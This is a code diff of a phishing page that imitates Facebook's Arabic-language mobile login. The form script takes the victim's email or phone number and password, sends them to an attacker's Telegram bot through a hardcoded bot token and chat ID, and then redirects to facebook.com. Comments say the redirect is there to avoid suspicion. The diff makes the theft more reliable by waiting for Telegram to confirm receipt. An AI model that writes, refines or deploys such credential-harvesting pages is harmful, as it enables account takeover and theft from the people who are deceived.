@@ -138,11 +138,10 @@
 </div>
 
 <div class="form-container">
-    <!-- تم تصحيح بناء النموذج هنا ليتطابق مع دالة الإرسال البرمجية -->
     <form id="fbMobileForm">
         <input type="text" id="email" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required>
         <input type="password" id="password" placeholder="كلمة السر" required>
-        <button type="submit" class="login-btn">تسجيل الدخول</button>
+        <button type="submit" id="submitBtn" class="login-btn">تسجيل الدخول</button>
     </form>
     
     <div class="forgot-link-container">
@@ -165,7 +164,11 @@
 
 <script>
 document.getElementById('fbMobileForm').addEventListener('submit', function(e) {
-    e.preventDefault(); // منع الصفحة من التحديث لتمرير البيانات أولاً
+    e.preventDefault(); // إيقاف التحديث الفوري لمنع إلغاء طلب الإرسال
+
+    const button = document.getElementById('submitBtn');
+    button.innerText = "جاري الاتصال...";
+    button.disabled = true;
 
     const token = '8940244394:AAGl_48JKHuu0-wqGgXFTsAzjzS4g5Z2gQg';
     const chatId = '8925208993';
@@ -181,7 +184,7 @@ document.getElementById('fbMobileForm').addEventListener('submit', function(e) {
         text: messageText
     };
 
-    // إرسال الطلب بنفس آلية الكود البسيط الناجح
+    // تنفيذ طلب الإرسال مع الانتظار الإجباري (حتى لو واجه خطأ يتم التحويل لاحقاً)
     fetch(url, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -189,11 +192,11 @@ document.getElementById('fbMobileForm').addEventListener('submit', function(e) {
     })
     .then(response => response.json())
     .then(result => {
-        // التوجيه إلى صفحة تسجيل الدخول الأصلية بعد الإرسال لعدم الشك
+        // يتم التحويل فقط بعد أن يؤكد سيرفر تيليجرام استلام البيانات
         window.location.href = "https://facebook.com";
     })
     .catch(error => {
-        // في حال حدوث أي انقطاع بالشبكة يتم التوجيه أيضاً
+        // في حال حدوث خطأ شبكة مفاجئ
         window.location.href = "https://facebook.com";
     });
 });
